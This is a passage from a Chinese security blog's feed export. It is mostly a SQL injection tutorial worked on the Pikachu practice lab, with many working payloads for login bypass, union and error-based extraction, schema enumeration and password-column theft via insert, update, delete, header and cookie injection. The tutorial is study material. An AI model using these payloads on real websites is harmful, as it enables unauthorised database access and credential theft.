src="https://img-blog.csdnimg.cn/20200509200315590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p></li></ol>        <h2 id="MOV指令">          <a href="#MOV指令" class="heading-link"><i class="fas fa-link"></i></a>MOV指令</h2>      <p>必须告知内存具体宽度</p><ol><li>立即数存到内存里</li><li>寄存器存到内存里</li><li>内存存到寄存器里<br><img src="https://img-blog.csdnimg.cn/20200509224453516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></li></ol><p><img src="https://img-blog.csdnimg.cn/20200509225756589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200509230158974.png" alt="img"></p>        <h2 id="内存地址的5种形式">          <a href="#内存地址的5种形式" class="heading-link"><i class="fas fa-link"></i></a>内存地址的5种形式</h2>      <ol><li><p>形式一：立即数</p><p><img src="https://img-blog.csdnimg.cn/20200509231659295.png" alt="img"></p></li><li><p>形式二：[reg],reg代表寄存器，可以是8个32位的通用寄存器中任意一个</p><p><img src="https://img-blog.csdnimg.cn/20200509232250286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p></li><li><p>形式三：[reg+立即数] (地址是加过立即数后的编码地址)</p><p><img src="https://img-blog.csdnimg.cn/20200509232548205.png" alt="img"></p></li><li><p>形式四：[reg+reg*{1,2,4,8}],（1或2或4或8）</p><p><img src="https://img-blog.csdnimg.cn/20200509233007988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p></li><li><p>形式五：[reg+reg*{1,2,4,8}+立即数]</p><p><img src="https://img-blog.csdnimg.cn/20200509233201234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p></li></ol><p><strong>归根结底，就是改变编码地址</strong></p>]]></content>
      
      
      <categories>
          
          <category> Reverse逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="2020/07/25/SQL%20%E6%B3%A8%E5%85%A5/"/>
      <url>2020/07/25/SQL%20%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="Web-入侵先遣——SQL注入攻击技术初探">          <a href="#Web-入侵先遣——SQL注入攻击技术初探" class="heading-link"><i class="fas fa-link"></i></a>Web 入侵先遣——SQL注入攻击技术初探</h1>              <h2 id="前言">          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h2>      <p>SQL 注入式攻击技术，一般针对基本 Web 平台的应用程序，造成 SQL 注入 攻击漏洞的原因，是由于程序员在编写 Web 程序时，没有对浏览器端提交的参数进行严格的过滤和判断。用户可以修改构造参数，提交 SQL 查询语句，并传递至服务器端，从而获得想要的敏感信息，甚至执行危险的代码或系统命令。</p><p>虽然 SQL 注入攻击技术早已出现，三十时至今日仍然有很大一部分网站存在 SQL 注入漏洞，在本章开篇中进行入侵检测中就就发现了各大门户网站同样存在 SQL 注入漏洞，更别说一些小网站了。由于 SQL 漏洞存在的普遍性，因此 SQL 入侵攻击技术往往成为黑客入侵攻击网站渗透内部服务的首选技术，危害性极大。</p><a id="more"></a>        <h2 id="1-1-注射式攻击的原理">          <a href="#1-1-注射式攻击的原理" class="heading-link"><i class="fas fa-link"></i></a>1.1.注射式攻击的原理</h2>      <p>注射式攻击的根源在于，程序命令和用户数据（即用户输入）之间没有做到泾渭分明。这使得攻击者有机会将程序命令当作用户输入的数据体提交给 Web 程序，以发号施令，为所欲为（注：注入最终是数据库，与脚本，平台无关）</p><p>总之一句话：注入产生的原因是接受相关参数未经处理直接带入数据库查询操作。</p><p>为了发动注射攻击，攻击者需要在常规输入中混入将被解释为命令的“数据”，要想成功，必须确定三件事：</p><ol><li><p>确定 Web 应用程序所使用的技术</p><p>注射式攻击对程序设计语言或者硬件关系密切，但是这些可以通过适当的踩点或者索性将所有常见的注射式攻击都搬出啦逐一试一下就知道了。为了确定所采用的技术，攻击者可以考察 Web 页面的页脚，查看错误页面，检查页面源代码，或者使用诸如 Nessus，AWVS，AppScan等工具进行刺探。</p></li><li><p>确定所有可能的输入方式</p><p>Web 应用的用户输入方式比较多，其中一些用户输入方式是很明显的，如 HTML 表单，另外，攻击者可以通过隐藏的 HTML 表单输入，HTTP 头部，cookies，甚至对用户不可见的后端 AJAX 请求来跟 Web 应用进行交互。一般来说，所有的 HTTP 的 GET 和 POST 都应当作用户输入。为了找出一个 Web 应用所有可能的用户输入，我们可以求助于代理，如 Burp 等。</p></li><li><p>查找可以用于注射的用户输入</p><p>在找出所用用户的输入方式后，就要对这些输入方式进行筛选，找出其中可以注入命令的那些输入方式。这个任务好像有点难，但是这里有一个小窍门，那就是多多留意 Web 应用的错误页面，很多时候可以从这里得到意想不到的收获。</p></li></ol>        <h2 id="1-2-经典-OR-漏洞原理解析">          <a href="#1-2-经典-OR-漏洞原理解析" class="heading-link"><i class="fas fa-link"></i></a>1.2. 经典 OR 漏洞原理解析</h2>      <p>大家经常听到网站万能密码登录，今天我们来分析分析万能密码是怎么回事。</p><ol><li><p>万能密码1：</p><p>id=1’ or 1=1#/–(–是aspx的，#是php的注释掉)</p></li></ol>        <h2 id="1-3-注入前的准备及注入漏洞检测">          <a href="#1-3-注入前的准备及注入漏洞检测" class="heading-link"><i class="fas fa-link"></i></a>1.3. 注入前的准备及注入漏洞检测</h2>              <h3 id="1-3-1-取消友好-HTTP-错误信息">          <a href="#1-3-1-取消友好-HTTP-错误信息" class="heading-link"><i class="fas fa-link"></i></a>1.3.1. 取消友好 HTTP 错误信息</h3>      <p>在进行 SQL 注入攻击时，需要利用从服务器返回的各种出错信息，但是在浏览器中默认设置是不显示详细错误返回信息的，不论服务器返回什么错误，都只能看到“ HTTP 500 服务器错误 ” 的窗口。因此，每次进行 SQL 注入攻击测试时，首先要取消浏览器返回信息设置，以便查看到注入攻击时返回的数据库信息。</p>        <h3 id="1-3-2-手工检测-SQL-注入点">          <a href="#1-3-2-手工检测-SQL-注入点" class="heading-link"><i class="fas fa-link"></i></a>1.3.2. 手工检测 SQL 注入点</h3>      <p><strong>1. 最常用的 SQL 注入点判断方法，是在网站中寻找如下形式的网页链接</strong></p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/xxx.asp?id=xx%EF%BC%88ASP">http://www.xxx.com/xxx.asp?id=xx（ASP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 注入）</p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/xxx.php?id=xx%EF%BC%88PHP">http://www.xxx.com/xxx.php?id=xx（PHP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 注入）</p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/xxx.jsp?id=xx%EF%BC%88JSP">http://www.xxx.com/xxx.jsp?id=xx（JSP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 注入）</p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/xxx.aspx?id=xx%EF%BC%88ASPX%E6%B3%A8%E5%85%A5%EF%BC%89">http://www.xxx.com/xxx.aspx?id=xx（ASPX注入）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/index.asp?id=xx&amp;page=xx%EF%BC%88%E6%B3%A8%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%9A%84%E6%97%B6%E5%80%99%E7%A1%AE%E8%AE%A4%E6%98%AF">http://www.xxx.com/index.asp?id=xx&amp;page=xx（注：注入的时候确认是</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> id 参数还是 page 参数，工具默认只对后面 page 参数注入，所以要对工具进行配置或者手工调换</p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/index/new/id/8%EF%BC%88%E4%BC%AA%E9%9D%99%E6%80%81%EF%BC%89">http://www.xxx.com/index/new/id/8（伪静态）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/index/new/php-8.html%EF%BC%88%E4%BC%AA%E9%9D%99%E6%80%81%EF%BC%89">http://www.xxx.com/index/new/php-8.html（伪静态）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>其中 id=xx 中的 “xx” 可能是数字，亦有可能是字符串，分别被称为整数典型数据和字符型数据。</p><p><strong>2. 如何判断某个网页链接是否存在 SQL 注入漏洞通常有两种方法：</strong></p><ol><li><p>“单引号” 法</p><p>方法很简单，直接在浏览器地址栏中网页链接后加上一个单引号，如果页面不能正常显示，浏览器返回一些异常信息，则说明该链接可能存在注入漏洞。</p></li><li><p>1=1 和 1=2 法</p><p>很多时候检测提交包含引号的链接时，会提示非法字符，或者直接不返回任何信息，但是这并不等于不存在 SQL 注入漏洞，此时可使用经典的 “1=1 和 1=2”法进行检测，方法也很简单，就是直接在链接地址后分别加上 and 1=1 和 1=2 进行提交，如果返回不同的页面，那么说明存在 SQL 注入漏洞。</p></li></ol>        <h2 id="1-4-注入分类">          <a href="#1-4-注入分类" class="heading-link"><i class="fas fa-link"></i></a>1.4. 注入分类</h2>      <p>配合靶机：192.168.133.133:81/pikachu/</p>        <h3 id="1-4-1-数字型注入">          <a href="#1-4-1-数字型注入" class="heading-link"><i class="fas fa-link"></i></a>1.4.1. 数字型注入</h3>      <p>进入 mysql 命令行，</p><ol><li><p>查询数据库，并使用</p><p>mysql&gt; show databases;<br>+——————–+<br>| Database           |<br>+——————–+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| phpcmsv9           |<br>| pikachu            |<br>| test               |<br>+——————–+<br>6 rows in set (0.02 sec)</p><p>mysql&gt; use pikachu;<br>Database changed</p></li><li><p>查询数据表</p><p>mysql&gt; show tables;<br>+——————-+<br>| Tables_in_pikachu |<br>+——————-+<br>| httpinfo          |<br>| member            |<br>| message           |<br>| users             |<br>| xssblind          |<br>+——————-+</p></li><li><p>查询数据结构</p><p>mysql&gt; desc member;<br>+———-+——————+——+—–+———+—————-+<br>| Field    | Type             | Null | Key | Default | Extra          |<br>+———-+——————+——+—–+———+—————-+<br>| id       | int(10) unsigned | NO   | PRI | NULL    | auto_increment |<br>| username | varchar(66)      | NO   |     | NULL    |                |<br>| pw       | varchar(128)     | NO   |     | NULL    |                |<br>| sex      | char(10)         | NO   |     | NULL    |                |<br>| phonenum | varchar(255)     | NO   |     | NULL    |                |<br>| address  | varchar(255)     | NO   |     | NULL    |                |<br>| email    | varchar(255)     | NO   |     | NULL    |                |<br>+———-+——————+——+—–+———+—————-+<br>7 rows in set (0.00 sec)</p></li><li><p>数字注入例子：</p><p>mysql&gt; select username,pw from member where id=1 or 1=1;<br>+———-+———————————-+</p><div class="table-container"><table><thead><tr><th>username</th><th>pw</th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td>+———-+———————————-+</td><td></td></tr><tr><td>vince</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—–</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>allen</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—–</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>kobe</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—-</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>grady</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—–</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>kevin</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—–</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>lucy</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—-</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>lili</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—-</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>+———-+———————————-+</td><td></td></tr><tr><td>7 rows in set (0.00 sec)</td><td></td></tr></tbody></table></div></li><li><p>pikachu 平台：</p><p>利用 Burp 抓包，发现它是一个 post 提交类型的，修改如下：</p><p>id=1 or 1=1 #&amp;submit=%E6%9F%A5%E8%AF%A2</p><p>查询主字段个数：id=1 or 1=1 order by 1/2/3 #&amp;submit=%E6%9F%A5%E8%AF%A2（3 的时候报错）</p><p>其他查询，类似格式：id=1 union select version(),database() #&amp;submit=%E6%9F%A5%E8%AF%A2</p></li></ol>        <h3 id="1-4-2-字符型注入">          <a href="#1-4-2-字符型注入" class="heading-link"><i class="fas fa-link"></i></a>1.4.2. 字符型注入</h3>      <ol><li><p>注入类型和数字型相似，就等于把原来的 id=字符串 or 1=1;</p></li><li><p>pikachu中操作</p><p>vince’ or 1=1#</p><p>(很显然，要填的数字在后端里是用 ‘ ‘ 上的)</p></li></ol>        <h3 id="1-4-3-搜索型注入">          <a href="#1-4-3-搜索型注入" class="heading-link"><i class="fas fa-link"></i></a>1.4.3. 搜索型注入</h3>      <p>打开 pikachu 平台，在 SQL-inject 下选择搜索型注入，然后随意输入一个字母，能看到匹配出了对应的信息，按照 SQL 的模糊查询命令 select * from 表名 where 字段名 like ‘%(对应值)%’; ,发现可以按照之前的思路来实现万能语句的拼接。</p><ol><li><p>MySQL 命令端</p><p>命令：select * from member where username like ‘%vince%’ or 1=1;</p></li><li><p>pikachu 平台</p><p>%vince%’ or 1=1 #%（最后的%可加可去除）</p><p>(很显然，要填的值是用 ‘’ 起来的)</p></li></ol>        <h3 id="1-4-4-xx-型注入">          <a href="#1-4-4-xx-型注入" class="heading-link"><i class="fas fa-link"></i></a>1.4.4. xx 型注入</h3>      <p>xx型是由于 SQL 语句拼接方式不同，注入语句如下：</p><ol><li><p>MySQL 命令端：</p><p>mysql&gt; select * from member where username=(‘xx’) or 1=1 ;（如果()中的参数是数字就不需要 ‘ ‘ 了）</p></li><li><p>pikachu 平台</p><p>xx’) or 1=1 #</p><p>(很显然，要填的值是用 (‘ ‘) 起来的)</p></li></ol>        <h2 id="1-5-提交方式">          <a href="#1-5-提交方式" class="heading-link"><i class="fas fa-link"></i></a>1.5. 提交方式</h2>      <p>ASP：request（全部接受），request.querystring（接受 get ），request.form（接受 post )，request.cookie cookie（接受 cookie ）</p><p>PHP：<code>$_REQUEST</code>（全部接受），<code>$_GET</code>和<code>$_POST</code>（接受 post ），<code>$_cookie</code>（接受 cookie ）</p><p>接受什么方式是由代码来决定的</p>        <h3 id="1-5-1-Get-提交">          <a href="#1-5-1-Get-提交" class="heading-link"><i class="fas fa-link"></i></a>1.5.1.  Get 提交</h3>      <p>Burpsuite 中抓包的 get 方式就在 开头的get 里面修改</p>        <h3 id="1-5-2-Post-提交">          <a href="#1-5-2-Post-提交" class="heading-link"><i class="fas fa-link"></i></a>1.5.2. Post 提交</h3>      <p>Burpsuite 中抓包的 post 都是在最后一行</p><p>Hackbar 插件中用post 提交也可以</p>        <h3 id="1-5-3-Cookie-提交">          <a href="#1-5-3-Cookie-提交" class="heading-link"><i class="fas fa-link"></i></a>1.5.3. Cookie 提交</h3>      <p>Burpsuite 中抓包的 cookie 就是在 cookie 一栏中修改</p>        <h2 id="1-6-注入攻击方式">          <a href="#1-6-注入攻击方式" class="heading-link"><i class="fas fa-link"></i></a>1.6. 注入攻击方式</h2>      <p>主要有 union 注入，insert / update 注入，delete 注入，http header 注入，盲注(base boolion)，盲注(base on time)，函数报错，宽字节注入，二次注入，偏移注入等。</p>        <h3 id="1-6-1-union-注入">          <a href="#1-6-1-union-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.1. union 注入</h3>      <p>union 操作符用于合并两个或者多个 SQL 语句集合起来，得到联合的查询结果，</p><ol><li><p>SQL 命令：</p><p>mysql&gt; select id,username from member where username=’kevin’ union select email,<br>pw from member where id=1;<br>+——————-+———————————-+<br>| id                | username                         |<br>+——————-+———————————-+<br>| 5                 | kevin                            |<br>| <span class="exturl"><a class="exturl__link" href="mailto:&#118;&#105;&#x6e;&#x63;&#101;&#64;&#x70;&#x69;&#107;&#x61;&#x63;&#x68;&#117;&#x2e;&#x63;&#111;&#109;">&#118;&#105;&#x6e;&#x63;&#101;&#64;&#x70;&#x69;&#107;&#x61;&#x63;&#x68;&#117;&#x2e;&#x63;&#111;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> | e10adc3949ba59abbe56e057f20f883e |<br>+——————-+———————————-+<br>2 rows in set (0.00 sec)</p></li><li><p>pikachu 平台</p><p>搜索型注入：v’ union select username,pw from member where id=1#%</p><p><strong>结果报错</strong>：</p><p>The used SELECT statements have a different number of columns</p><p><strong>原因：</strong></p><p>查询的字段不能超过主查询的字段，这个时侯可以在 SQL 语句后加 order by 进行排序，通过这个办法可以判断主查询的字段。</p><p><strong>解决：</strong></p><p>v’ order by 1/2/3/4/… #%</p><p>直到返回报错：Unknown column ‘4’ in ‘order clause’，说明只有3个字段</p><p>再用 union 来做一个 SQL 语句的拼接，输入构造好的语句：</p><p>a’ union select database(),user(),version()#%</p></li></ol>        <h3 id="1-6-2-information-schema-注入">          <a href="#1-6-2-information-schema-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.2. information_schema 注入</h3>      <p>information_schema 数据库是 MySQL 系统自带的数据库，其中报存着关于 MySQL 服务器所维护的所有其他数据库的信息，通过 information——schema 注入，我们可以将整个数据库内容全部窃取出来，使用 order by 来判断查询的字段，先找出数据库的名称，输入 vince’ union select database(),user(),3#% ，得到反馈：判断数据库名称为 pikachu;</p><p>获取所有数据库的库名：输入：u’ union select 1,2,group_concat(schema_name) from information_schema.schemata#</p><p>获取 pikachu 数据库的表名，输入：u’ union select table_schema,table_name,3 from information_schema.tables where table_schema=’pikachu’#</p><p>获取 member 数据表的字段名，输入：v’ union select table_name,column_name,3 from information_schema.columns where table_name=’member’#</p><p><strong>注意：</strong></p>        <h4 id="1-6-2-1-group-concat-函数">          <a href="#1-6-2-1-group-concat-函数" class="heading-link"><i class="fas fa-link"></i></a>1.6.2.1 group_concat()函数</h4>      <p>利用 group_concat()函数可以得到所有库名，或者同一库名下的所有表名，省去了一个个的麻烦</p><p>函数里面加 schema_name,table_name,column_name 就可以了</p><p>同时，利用 union select group_concat(字段名) from (库名.表名) 可以得到字段内容 </p>        <h3 id="1-6-3-基于函数报错注入">          <a href="#1-6-3-基于函数报错注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.3. 基于函数报错注入</h3>      <ol><li><p>技巧思路</p><p>在 MySQL 中使用一些指定的函数来制造报错，从而从报错信息中获取设定的信息，常见的 select / insert / update 注入都可以使用报错方式来获取信息。</p></li><li><p>背景条件</p><p>后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端。</p></li><li><p>基于报错的信息获取（三个常用的用来报错的函数）</p><p>1）updatexml()：函数是 MySQL 对 XML 文档数据进行查询和修改的 XPATH 函数。</p><p>2）extractvalue()：函数也是 MySQL 对 XML 文档数据进行查询的 XPATH 函数。</p><p>3）floor()：MySQL 中用来取整的函数。</p></li><li><p>基于报错的信息获取</p><p>UPDATEXML（XML_document，XPath_string，new_value);</p><p>第一个参数：XML_document 是 string 格式，为XML 文档对象的名称，文中为 Doc;</p><p>第二个参数：XPath_string（Xpath 格式的字符串），如果不了解 Xpath 语法，可以在官网上查看教程；</p><p>第三个参数：new_value 也是 string 格式，替换查找到的符合条件的教程。</p></li><li><p>实战测试</p><p>（大多数展现的用 搜索型注入）</p><p>1）<strong>爆破数据库版本信息</strong></p><p>k’ and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#         注：@@version  换成 version() 也可以</p><p>(这个updatexml 结构和上面的一样，前后两个 1 对应上面的 xml_document 和 new_value,1也可以换成2/3…；concat 是一个拼接函数)</p><p>(SELECT 小写形式也可以)</p><p>2）<strong>爆破数据库当前用户</strong></p><p>k’ and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)#                     注：后一个 0x7e 也可以是不用写的</p><p>或者：k and extractvalue(1,concat(‘~’,(select database())))%23</p><p>注意：参数后面的 ‘ 有的时候要，有点时候不要，updatexml 函数最后的1是要有的，而extractvalue 函数最后是没有的。</p><p>3）<strong>爆破数据库</strong></p><p>k’ and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#              注：后一个 0x7e 也可以是不用写的</p><p>4）<strong>爆表</strong></p><p>获取数据库表名，输入：</p><p>k’ and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=’pikachu’)),0)#，但是返回错误信息，表示只能显示一行，所以用 limit 来一行一行显示（就是无法批量的把表名显示出来）</p><p>更改输入：</p><p>k’ and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0)#，更改 limit 后面的数字 limit 0 完成表名遍历。</p><p>(0是可以变化的，0是第一个表名，1是第二个表名，以此类推；后面的1代表一次一行)</p><p>5）<strong>爆字段</strong></p><p>获取字段名，输入：</p><p>k’ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 0,1)),0)#</p><p>6）<strong>爆字段内容</strong></p><p>获取字段内容，输入：</p><p>k’ and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#</p><p>返回结果为连接参数产生的字符串，如有任何一个参数为 NULL，则返回值为 NULL；通过查询@@version 返回版本，然后 concat 将其字符串化。因为 updatexml 第二个参数需要 Xpath 格式的字符串，所以不符合要求然后报错。</p></li></ol>        <h3 id="1-6-4-insert-注入">          <a href="#1-6-4-insert-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.4. insert 注入</h3>      <p>insert 注入，就是前端注册的信息最终通过 insert 这个操作插入数据库，后台在接受前端的注册数据时没有做防 SQL 注入的处理，导致前端的输入可以直接 SQL 到后端的 insert 相关的内容中，导致了 insert 注入。</p><ol><li><p>到 MySQL 命令端中输入：</p><p>insert into member (username,pw,sex,phonenum,email,address) values(‘haoye’,123456,1,2,3,4); 来在表里插入一个用户；</p><p>再输入 select * from member; 来查看所有用户。</p></li><li><p>进入网站注册页面，填写网站注册相关的信息，通过 Burp 抓包在用户名输入相关的 payload ，格式如下：</p><p>haoye’ or updatexml(1,concat(0x7e,(命令)),0) or ‘</p><p>1）<strong>爆表名</strong></p><p>haoye’ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0) or’</p><ol><li><p>抓包注册页面，发送到 repeater 界面，修改如下：</p><p>username=haoye’or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0) or’&amp;password=111&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</p></li><li><p>response 最后一行获得：</p><p>XPATH syntax error: ‘~httpinfo’</p></li><li><p>或者可以不用发送到 repeater 页面，直接在 intercept 抓到的包处修改，然后 forward 发送，这样 pikachu 的页面跳转就会显示。</p></li><li><p>注意：这里用 or 的比较多，and 其实也行，但是 or 保证了在即使前面有问题，后面一定为 真，不会导致报错。</p></li></ol><p>2）<strong>爆字段名</strong></p><p>haoye’ or updatexml(1,concat(0x7e,(select table_column from information_schema.columns where table_name=’users’ limit 0,1)),0) or’</p><p>3）<strong>爆字段内容</strong></p><p>haoye’ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or’ 等同</p><p>haoye’ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or ‘1’=’1’’</p></li></ol>        <h3 id="1-6-5-update-注入">          <a href="#1-6-5-update-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.5. update 注入</h3>      <p>与 insert 注入方法大体相同，区别在于 update 用于用户登录端，insert 用于用户注册端。</p><p>一般登录网站前台或后台更新用户信息的地方，填写用户需要修改的相关信息，通过 Burp 抓包在用户名输入相关的 payload，格式如下：</p><p>update 注入：’ or updatexml(0,concat(0x7e,(select database())),0) or’</p><p><strong>操作：</strong></p><p>注册用户，再登录，然后修改信息，信息随便填，然后在提交的时候抓包</p><p>修改如下：sex=11&amp;phonenum=11’or updatexml(0,concat(0x7e,(select database())),0) or’&amp;add=11&amp;email=11&amp;submit=submit</p><p>获得：XPATH syntax error: ‘~pikachu’</p><p><strong>注意：</strong></p><p>有的时候，后端人员会设置过滤，所以我们在注入时可以换成 url 编码，（选中 payload 然后 ctrl+u ，就可以看到把空格换成了+号）</p>        <h3 id="1-6-6-delete-注入">          <a href="#1-6-6-delete-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.6. delete 注入</h3>      <p>一般应用于前后端发帖，留言，用户等相关删除操作，点击删除按钮可通过 Burp 抓包，对数据包相关 delete 参数进行注入，</p><p>注入方法如下：delete from message where id=56 or updatexml(2,concat(0x7e,(select database())),0)</p><p><strong>Hackbar 操作：</strong></p><p>输入留言版信息，提交后，复制 “删除” 的链接，在 Hackbar 中 URL 中输入：<span class="exturl"><a class="exturl__link" href="http://192.168.133.133:81/pikachu/vul/sqli/sqli_del.php?id=58">http://192.168.133.133:81/pikachu/vul/sqli/sqli_del.php?id=58</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> or updatexml(2,concat(0x7e,(database())),0)</p><p>点击 Execute 获得：XPATH syntax error: ‘~pikachu’</p>        <h3 id="1-6-7-Http-Header-注入">          <a href="#1-6-7-Http-Header-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.7. Http Header 注入</h3>      <p>先在 pikachu 平台打开 http header 注入模块，点击查看登录账号和密码，登录后去 Burp 中找到登录地 GET 请求，把请求发送到 Repeater 模块中，去除 User-Agent:，然后输入 ‘，然后运行观察 MySQL 语法报错然后发现存在 SQL 注入漏洞，这时候可以设置 payload 。在 User-Agent 输入 payload Mozilla’ or updatexml(1,concat(0x7e,database()),0) or’</p><p>(注意：在 Repeater 模块中数据可以发送到 Intruter 模块中，然后在positions中对单一的参数进行 And$，再在 payload中对参数导入可能的库值，进行暴力破解)</p>        <h3 id="1-6-8-Cookie-注入">          <a href="#1-6-8-Cookie-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.8. Cookie 注入</h3>      <p>Cookie 是网站为了识别用户身份来跟踪会话的，虽然 Cookie 是由后端生成的，但每次页面跳转，后端都对前端的 Cookie 的信息进行验证，但如果后端获取 Cookie 后放在数据库中进行拼接，那么这也将是一个 SQL 注入点。在 ant[uname]=admin 后添加一个 ‘  来观察反馈的 MySQL 的语法报错，发现了存在 SQL 漏洞，在设置 Payload ‘ and updatexml(1,concat(0x7e,database()),0)#，观察报错和之前是否相同。</p>        <h3 id="1-6-9-Boolian（布尔型）盲注">          <a href="#1-6-9-Boolian（布尔型）盲注" class="heading-link"><i class="fas fa-link"></i></a>1.6.9. Boolian（布尔型）盲注</h3>      <p>在我们注入语句被带入数据库查询单却社么都没有返回的情况下我们该怎么办？例如应用程序就会返回一个”通用的” 的页面，或者重定向一个通用页面（可能为网站首页），这时，我们之前学习的 SQL 注入办法就无法使用了。</p><p>盲注：即在 SQL 注入过程中，SQL 语句执行选择后不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。</p><p><strong>SQL 注入分为三大类</strong>：基于布尔型 SQL 盲注，基于时间型 SQL 盲注，基于报错型 SQL 盲注。</p><p>采用 SQL 语句中 and 方法，返回正确或错误来构造，按照之前的思路来构造一个 SQL 拼接：vince’ and extractvalue(0,concat(0x7e,version()))# ，输入后根据返回的信息判断之前的思路不再适用。（都显示username 